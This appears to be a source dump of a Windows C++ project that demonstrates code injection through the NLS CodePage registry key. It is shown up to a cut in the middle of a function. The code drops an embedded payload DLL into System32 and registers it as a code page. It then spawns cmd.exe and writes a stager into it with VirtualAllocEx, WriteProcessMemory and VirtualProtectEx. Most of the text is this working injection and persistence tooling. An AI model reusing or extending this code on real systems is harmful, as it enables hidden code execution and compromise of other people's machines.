Project Path: arc_gmh5225_NlsCodeInjectionThroughRegistry_3qnujljb

Source Tree:

```txt
arc_gmh5225_NlsCodeInjectionThroughRegistry_3qnujljb
├── NLSRegistryCodeInjection
│   ├── NLSRegistryCodeInjection.aps
│   ├── NLSRegistryCodeInjection.cpp
│   ├── NLSRegistryCodeInjection.rc
│   ├── NLSRegistryCodeInjection.vcxproj
│   ├── NLSRegistryCodeInjection.vcxproj.filters
│   ├── NLSRegistryCodeInjection.vcxproj.user
│   ├── PayloadDll.dll
│   ├── headers.hpp
│   ├── payload.cpp
│   ├── payload.hpp
│   └── resource1.h
├── NLSRegistryCodeInjection.sln
├── README.md
└── ShellcodeInjection
    ├── ShellcodeInjection.asm
    ├── ShellcodeInjection.cpp
    ├── ShellcodeInjection.obj
    ├── ShellcodeInjection.vcxproj
    ├── ShellcodeInjection.vcxproj.filters
    ├── ShellcodeInjection.vcxproj.user
    ├── all sections
    │   └── shellcode.bin
    ├── defs.h
    ├── mllink$.lnk
    └── x64
        └── Release
            ├── ShellcodeInjection.Build.CppClean.log
            ├── ShellcodeInjection.exe.recipe
            ├── ShellcodeInjection.log
            └── ShellcodeInjection.vcxproj.FileListAbsolute.txt

```

`NLSRegistryCodeInjection.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.0.32002.185
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "NLSRegistryCodeInjection", "NLSRegistryCodeInjection\NLSRegistryCodeInjection.vcxproj", "{97C68020-174C-46C3-ABED-A71AC954AF56}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ShellcodeInjection", "ShellcodeInjection\ShellcodeInjection.vcxproj", "{4225C8D1-E331-4436-BA0C-4F8051B8CBDF}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{97C68020-174C-46C3-ABED-A71AC954AF56}.Debug|x64.ActiveCfg = Debug|x64
		{97C68020-174C-46C3-ABED-A71AC954AF56}.Debug|x64.Build.0 = Debug|x64
		{97C68020-174C-46C3-ABED-A71AC954AF56}.Debug|x86.ActiveCfg = Debug|Win32
		{97C68020-174C-46C3-ABED-A71AC954AF56}.Debug|x86.Build.0 = Debug|Win32
		{97C68020-174C-46C3-ABED-A71AC954AF56}.Release|x64.ActiveCfg = Release|x64
		{97C68020-174C-46C3-ABED-A71AC954AF56}.Release|x64.Build.0 = Release|x64
		{97C68020-174C-46C3-ABED-A71AC954AF56}.Release|x86.ActiveCfg = Release|Win32
		{97C68020-174C-46C3-ABED-A71AC954AF56}.Release|x86.Build.0 = Release|Win32
		{4225C8D1-E331-4436-BA0C-4F8051B8CBDF}.Debug|x64.ActiveCfg = Debug|x64
		{4225C8D1-E331-4436-BA0C-4F8051B8CBDF}.Debug|x64.Build.0 = Debug|x64
		{4225C8D1-E331-4436-BA0C-4F8051B8CBDF}.Debug|x86.ActiveCfg = Debug|Win32
		{4225C8D1-E331-4436-BA0C-4F8051B8CBDF}.Debug|x86.Build.0 = Debug|Win32
		{4225C8D1-E331-4436-BA0C-4F8051B8CBDF}.Release|x64.ActiveCfg = Release|x64
		{4225C8D1-E331-4436-BA0C-4F8051B8CBDF}.Release|x64.Build.0 = Release|x64
		{4225C8D1-E331-4436-BA0C-4F8051B8CBDF}.Release|x86.ActiveCfg = Release|Win32
		{4225C8D1-E331-4436-BA0C-4F8051B8CBDF}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {1249E4BF-71B7-41C3-A888-72271D162739}
	EndGlobalSection
EndGlobal

```

`NLSRegistryCodeInjection/NLSRegistryCodeInjection.cpp`:

```cpp
#include "payload.hpp"
#include "headers.hpp"

//Pending: Make initializer_list cleaner
uint32_t main(void)
{
    std::initializer_list<std::wstring> list = { L"SYSTEM\\ControlSet001\\Control\\Nls\\CodePage", L"Payload.dll" , L""};
    auto regObj = std::make_unique<RegistryManipulation>(list);
    if (OpenKeyForNlsModification(regObj.get()))
    {
#ifdef DEBUG
        std::printf("Key has been modified, now preparing for injection\n");
#endif 
        std::printf("Payload executed sucessfully :)\n");
        system("pause");
    }

    return EXIT_SUCCESS;
}
```

`NLSRegistryCodeInjection/NLSRegistryCodeInjection.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//
#include "resource1.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// Español (México) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ESM)
LANGUAGE LANG_SPANISH, SUBLANG_SPANISH_MEXICAN
#pragma code_page(1252)

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    "resource1.h\0"
END

2 TEXTINCLUDE 
BEGIN
    "#include ""winres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE 
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// IDR_RT_RCDATA1
//

IDR_RT_RCDATA1     RT_RCDATA          "PayloadDll.dll"

#endif    // Español (México) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED


```

`NLSRegistryCodeInjection/NLSRegistryCodeInjection.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{97c68020-174c-46c3-abed-a71ac954af56}</ProjectGuid>
    <RootNamespace>NLSRegistryCodeInjection</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp20</LanguageStandard>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp20</LanguageStandard>
      <Optimization>Disabled</Optimization>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="NLSRegistryCodeInjection.cpp" />
    <ClCompile Include="payload.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="headers.hpp" />
    <ClInclude Include="payload.hpp" />
    <ClInclude Include="resource1.h" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="NLSRegistryCodeInjection.rc" />
  </ItemGroup>
  <ItemGroup>
    <None Include="PayloadDll.dll" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`NLSRegistryCodeInjection/NLSRegistryCodeInjection.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Archivos de origen">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Archivos de encabezado">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Archivos de recursos">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="NLSRegistryCodeInjection.cpp">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="payload.cpp">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="headers.hpp">
      <Filter>Archivos de encabezado</Filter>
    </ClInclude>
    <ClInclude Include="payload.hpp">
      <Filter>Archivos de encabezado</Filter>
    </ClInclude>
    <ClInclude Include="resource1.h">
      <Filter>Archivos de encabezado</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="NLSRegistryCodeInjection.rc">
      <Filter>Archivos de recursos</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="PayloadDll.dll" />
  </ItemGroup>
</Project>
```

`NLSRegistryCodeInjection/NLSRegistryCodeInjection.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`NLSRegistryCodeInjection/headers.hpp`:

```hpp
#pragma once
#include <string>
#include <vector>
#include <tuple>
#include <initializer_list>
#include <Windows.h>
#include <iostream>
#include <cassert> 

#define MAX_STRING_VALUES 3 
#define MAX_LENGTH_PATH 200

enum class Index : uint32_t
{
    SUBKEY_KEY_VALUE,
    DLL_NAME,
    FULL_PAYLOAD_DLL_PATH
};

enum class CodePageIDIndex : uint32_t 
{
    CodePageInt,
    CodePageHex
};

struct IndexingStringValues
{
    std::wstring StringValues[MAX_STRING_VALUES];
    Index IDs[MAX_STRING_VALUES];
};

class ShellcodeInjector {
public:
    //Methods
    //1.-Create memory and write memory in other process. Allocate contiguous buffer for pointers to the virtual addresses.
    ShellcodeInjector() {

    }
    //Create And Write Memory.
    //void CreateAndWriteMemory(HANDLE hProcess, ) {}
    //2.-Execute thread based on member.

private:
    void** m_pBlocksMemory;
    uint32_t m_numberOfBlocks;
};



typedef class RegistryManipulation
{
public:
    RegistryManipulation(std::initializer_list <std::wstring> l)
    {
        assert(l.size() <= MAX_STRING_VALUES);
        for (auto [i, j] = std::tuple{ 0,  l.begin() }; i < l.size(); i++, j++)
        {
            keyValues.StringValues[i] = *j;
            keyValues.IDs[i] = static_cast<Index>(i);
        }
        hSubkeyNls = NULL;
        m_CodePageIdHex = NULL;
        m_CodePageIdInt = NULL;
        ZeroMemory(&m_procInfo, sizeof(PROCESS_INFORMATION));
    }
    const wchar_t* getStringBuffer(Index i) {
        for (auto index : keyValues.IDs) {
            if (i == index) {
                return keyValues.StringValues[static_cast<uint32_t>(i)].c_str();
            }
        }
        return nullptr;
    }
    bool compareStringEqual(Index i, std::wstring_view s) {
        for (auto index : keyValues.IDs){
            if (i == index) {
                return keyValues.StringValues[static_cast<uint32_t>(i)].compare(s) == 0;
            }
        }
        return false;
    }
    void setStringBuffer(wchar_t* str, Index index) {
        for (auto i : keyValues.IDs) {
            if (i == index) {
                keyValues.StringValues[static_cast<UINT>(i)] = str;
            }
        }
    }
    size_t getStringSize(Index i) {
        for (auto index : keyValues.IDs) {
            if (i == index) {
                return keyValues.StringValues[static_cast<uint32_t>(i)].size() * sizeof(wchar_t);
            }
        }
        return NULL;
    }
    void setCodePageID(uint32_t id, CodePageIDIndex i){
        switch (i){
            case CodePageIDIndex::CodePageInt: {
                m_CodePageIdInt = id;
                break;
            }
            case CodePageIDIndex::CodePageHex:
            {
                m_CodePageIdHex = id;
                break;
            }
            default:
            {
                std::printf("Invalid option for setting m_CodePage\n");
                return;
            }
        }
    }
    uint32_t getCodePageID(CodePageIDIndex i){
        switch (i){
            case CodePageIDIndex::CodePageInt: 
            {
                return m_CodePageIdInt;
            }
            case CodePageIDIndex::CodePageHex:
            {
                return m_CodePageIdHex;
            }
            default:
            {
                std::printf("Invalid option for setting m_CodePage\n");
                return NULL;
            }
        }
    }
    ~RegistryManipulation() {
        for (auto key : keyValues.StringValues) {
            key = L"";
        }
        RegCloseKey(hSubkeyNls);
        hSubkeyNls = NULL;
        ZeroMemory(&m_procInfo, sizeof(PROCESS_INFORMATION));
    }

//public members:
    HKEY hSubkeyNls;
    PROCESS_INFORMATION m_procInfo;
private:
    //Same for this one.
    IndexingStringValues keyValues;
    uint32_t m_CodePageIdHex, m_CodePageIdInt;
    //This can be passed as inheritance probably.
    ShellcodeInjector injector;
}*PRegistryKey;

```

`NLSRegistryCodeInjection/payload.cpp`:

```cpp
#include "headers.hpp"
#include "payload.hpp"
#include "strsafe.h"
#include "payload.hpp"
#include "resource1.h"
#define MAX_SIZE_DATA 260

//IMPLEMENTED IT two different functions for convertion. 
UINT StringToIntDecimal(PWCHAR str) noexcept
{
	uint32_t num = _wtoi(str);
	return num;
}
UINT StringToInt(PWCHAR str) noexcept {

	wchar_t chrSubkey, chr, * j;
	UINT i;
	j = str;
	chrSubkey = *str;
	for (i = 0; *j; chrSubkey = *j)
	{
		++j;
		if ((chrSubkey - 0x41) > 5u)
		{
			if ((chrSubkey - 0x30) > 9u)
			{
				if ((chrSubkey - 0x61) > 5u)
					return i;
				chr = chrSubkey - 87;
			}
			else
			{
				chr = chrSubkey - 0x30;
			}
		}
		else
		{
			chr = chrSubkey - 55;
		}
		i = chr + 16 * i;
	}
	return i;
}
BOOLEAN CompareLastElementString(PWCHAR str1, PWCHAR str2, BOOLEAN CaseInsensitive)
{
	bool bResult = false;
	//Has to find .dll somewhere, in the substring, otherwise doesnt exist.
	wchar_t* dll = wcsstr(str1, str2);
	if (dll != nullptr) {
		bResult = true;
	}
	return bResult;
}
bool FindCodePageWithPayload(PRegistryKey regObject, UINT dwValuesCount, UINT dwMaxLenValues){
	DWORD dwCountName = 0, typeData, ValueDataSize = 0;
	//uint32_t CodePageInt;
	WCHAR CodePageID[MAX_PATH], ValueData[MAX_SIZE_DATA];
	bool bResult = false;

	for (UINT i = 0; i < dwValuesCount; i++) {
		dwCountName = 260;  
		ValueDataSize = 260;
		LSTATUS status = RegEnumValueW(regObject->hSubkeyNls, i, CodePageID, &dwCountName, nullptr, &typeData, (BYTE*)&ValueData,
			&ValueDataSize);
		if (status != ERROR_SUCCESS && GetLastError() != ERROR_ALREADY_EXISTS)
		{
			std::wprintf(L"Could not query Code Page ID %s, Last error: [%x]\n", CodePageID, GetLastError());
			continue;
		}
#ifdef _DEBUG
		std::wprintf(L"Iterating: %d - %s = %s\n", i, CodePageID, ValueData);
#endif 
		if (typeData == REG_SZ && regObject->compareStringEqual(Index::DLL_NAME, ValueData)){
#ifdef _DEBUG
			std::wprintf(L"Payload value has been found!: %d - %s = %s\n", i, CodePageID, ValueData);
#endif
			uint32_t strHex = std::stoull(CodePageID, nullptr, 10);
			uint32_t strDecimal = std::stoull(CodePageID, nullptr, 16);
			regObject->setCodePageID(strHex, CodePageIDIndex::CodePageInt);
			regObject->setCodePageID(strDecimal, CodePageIDIndex::CodePageHex);
			std::wprintf(L"Values: CodepageHex = %d, CodePageInt = 0x%x\n", strDecimal, strHex);
			bResult = true;
			break;
		}
	}
	return bResult;
}

bool IterateCodePageAndExtractProperId(PRegistryKey regObject) {
	DWORD dwMaxLenValues, dwCountName = 0, dwValuesCount, typeData, ValueDataSize = 0;
	uint32_t CodePageInt = NULL, posCount = NULL;
	bool correctRet = false;
	LSTATUS status;
	WCHAR CodePageID[MAX_PATH], ValueData[MAX_SIZE_DATA];

	//Queries information for the NLS subkey, mostly related to the values, which is the part that interests us the most.
	if (::RegQueryInfoKeyW(regObject->hSubkeyNls, nullptr, nullptr, nullptr,
		nullptr, nullptr, nullptr, &dwValuesCount, &dwMaxLenValues, nullptr, nullptr, nullptr))
	{
		std::cerr << "Could not query information for the key, last error is: " << GetLastError() << "\n";
		return correctRet;
	}
	//Only one failing, lets fix it.
	if (FindCodePageWithPayload(regObject, dwValuesCount, dwMaxLenValues)){
		correctRet = true;
		return correctRet;
	}
	//Find one with .dll, then from there increase one until it works out.
	for (UINT i = 0; i < dwValuesCount; i++) {
		dwCountName = 260;
		ValueDataSize = 260;
		status = RegEnumValueW(regObject->hSubkeyNls, i, CodePageID, &dwCountName, nullptr, &typeData, (BYTE*)&ValueData,
			&ValueDataSize);
		if ((status != EXIT_SUCCESS) && (GetLastError() != ERROR_ALREADY_EXISTS))
		{
			std::wprintf(L"Could not query Code Page ID %s, Last error: [%x]\n", CodePageID, status);
			continue;
		}
#ifdef _DEBUG
		std::wprintf(L"Querying value i: %d, %s = %s\n", i, CodePageID, ValueData);
#endif
		if (typeData == REG_SZ && CompareLastElementString(ValueData, const_cast<wchar_t*>(L".dll"), FALSE))
		{
#ifdef _DEBUG
			std::wprintf(L"Value with dll found in i = %d, %s = %s\n", i, CodePageID, ValueData);
			//Convert from str to hex
			CodePageInt = StringToInt(CodePageID);
			std::wprintf(L"Code page as int is: %x\n", CodePageInt);
#endif // _DEBUG
			CodePageInt = StringToInt(CodePageID);
			posCount = i;
			break;
		}
	}
	if (CodePageInt == NULL) {
		std::printf("Could not find apropiate dll extension inside one of the subvalues\n");
		return correctRet;
	}
	//FIX THIS CODE, WHEN PRINTING THERE IS SOMETHING THAT GOES WRONG.
	CodePageInt += 1;
	for (UINT i = 0; i < dwValuesCount - posCount; i++) {
		//2.Then we proceed to check if the code page ID value exists, if it doesnt, we create it and set the data.
		if (SUCCEEDED(StringCchPrintfW(ValueData, MAX_SIZE_DATA, L"%04x", CodePageInt)))
		{
			std::printf("Trying to create in CodePage ID %x\n", CodePageInt);
		}
		status = RegQueryValueEx(regObject->hSubkeyNls, ValueData, NULL, NULL, NULL, NULL);
		if (status != ERROR_SUCCESS && status == ERROR_FILE_NOT_FOUND)
		{
			if (!RegSetValueExW(regObject->hSubkeyNls, ValueData, NULL, REG_SZ, (BYTE*)regObject->getStringBuffer(Index::DLL_NAME),
				regObject->getStringSize(Index::DLL_NAME)))
			{
				//std::wprintf(L"The string value of the data is: %s\n", ValueData);
				uint32_t CodePageDecimal = StringToIntDecimal(ValueData);
				std::printf("Sucessfully created dll payload in CodePage ID %x\n", CodePageInt);
				regObject->setCodePageID(CodePageInt, CodePageIDIndex::CodePageHex);
				regObject->setCodePageID(CodePageDecimal, CodePageIDIndex::CodePageInt);
				std::wprintf(L"Values: CodepageHex = %d, CodePageInt = 0x%x\n", CodePageInt, CodePageDecimal);
				correctRet = true;
				break;
			}
		}
		CodePageInt += 1;
	}
	return correctRet;
}

bool CreateProcessToInject(LPPROCESS_INFORMATION procInfo) {
	STARTUPINFOW infoProc;
	//PROCESS_INFORMATION processInfo;
	ZeroMemory(&infoProc, sizeof(infoProc));
	infoProc.cb = sizeof(infoProc);
	ZeroMemory(procInfo, sizeof(procInfo));
	wchar_t path[MAX_PATH];
	GetSystemDirectoryW(path, MAX_PATH);
	wcscat_s(path, MAX_PATH, L"\\cmd.exe");
	return CreateProcessW(NULL, path, NULL, NULL, false, CREATE_NEW_CONSOLE, NULL, NULL, &infoProc, procInfo) != NULL;
}

bool DropSystemDllPayload(PRegistryKey regObject) {
	HMODULE hMod = GetModuleHandleA(NULL);
	HRSRC hResource = FindResource(hMod, MAKEINTRESOURCE(IDR_RT_RCDATA1), L"RT_RCDATA");
	if (hResource == NULL)
	{
		printf("Could not find the payload dll resource, exiting...\n");
		return false;
	}
	DWORD dwSizeResource = SizeofResource(hMod, hResource);
	HGLOBAL hResLoaded = LoadResource(hMod, hResource);
	if (hResLoaded == NULL)
	{
		printf("Could not find the dll, exiting...\n");
		return false;
	}
	auto pBuffer = static_cast<BYTE*> (LockResource(hResLoaded));
	LPWSTR pathPayload = new wchar_t[MAX_PATH];
	GetSystemDirectoryW(pathPayload, MAX_PATH);
	wcscat_s(pathPayload, MAX_PATH, L"\\");
	wcscat_s(pathPayload, MAX_PATH, regObject->getStringBuffer(Index::DLL_NAME));
	regObject->setStringBuffer(pathPayload, Index::FULL_PAYLOAD_DLL_PATH);
	HANDLE hFile = CreateFileW(pathPayload, GENERIC_ALL, FILE_SHARE_DELETE,
		NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
	delete[] pathPayload;
	if (hFile == INVALID_HANDLE_VALUE)
	{
		if (GetLastError() == ERROR_FILE_EXISTS){
			std::printf("File already exists, trying to set up registry.\n");
			return true;
		}
		std::printf("Could not obtain HANDLE to the newly created FILE, last error is %d\n", GetLastError());
		return false;
	}
	DWORD dwNumberBytesWritten;
	if (!WriteFile(hFile, pBuffer, dwSizeResource, &dwNumberBytesWritten, nullptr))
	{
		std::printf("Could not write to file, last error is %d\n", GetLastError());
		CloseHandle(hFile);
		return false;
	}
	CloseHandle(hFile);
	return true;
}

void SelfSpawnPayload(DWORD dwCodePageId)
{
	if (!GetConsoleWindow())
	{
		if (!AllocConsole()) {
			return;
		}
	}
	if (!SetConsoleOutputCP(dwCodePageId)) {
		std::printf("Could not self test injection in SetConsoleOutputCP, last error is: 0x%x\n", GetLastError());
		return;
	}
	if (!SetConsoleCP(dwCodePageId)) {
		std::printf("Could not self test for SetConsoleCp: Last error is 0x%x\n", GetLastError());
		return;
	}
	SetThreadUILanguage(0);
}

void InjectStagerToPayload(PRegistryKey regObject) {
	LPVOID lpCodePageID = (LPVOID)VirtualAllocEx(regObject->m_procInfo.hProcess, NULL, sizeof(DWORD), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (lpCodePageID == nullptr) {
		std::printf("Could not allocate buffer in remote process\n");
		return;
	}
	DWORD codePageID = regObject->getCodePageID(CodePageIDIndex::CodePageInt);
	if (!WriteProcessMemory(regObject->m_procInfo.hProcess, lpCodePageID, &codePageID, sizeof(DWORD), NULL)) {
		std::printf("Could not create write memory with codePageID to inject\n");
		return;
	}
	//Alloc and write shellcode, easiest way is VirtualAllocEx + WPM, but we have to pass arg, so I am not so sure how I am going to do that...
	LPVOID ShellcodeMemory = (LPVOID)VirtualAllocEx(regObject->m_procInfo.hProcess, NULL, lengthInject, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (ShellcodeMemory == nullptr) {
		std::printf("Could not allocate buffer in remote process\n");
		return;
	}
	//This will write the payload in the remote process.
	if (!WriteProcessMemory(regObject->m_procInfo.hProcess, ShellcodeMemory, &StubInject, lengthInject, NULL)) {
		std::printf("Could not create write memory with codePageID to inject\n");
		return;
	}
	//Need to change protection to EXECUTE_READ.
	DWORD dwProtection;
	if (!VirtualProtectEx(regObject->m_procInfo.hProcess, ShellcodeMemory, lengthInject, PAGE_EXECUTE_READ, &dwProtection)) {
		std::printf("Could not change protection of memory for shellcode injection. Last error is 0x%x\n", GetLastError());
		return;
	}
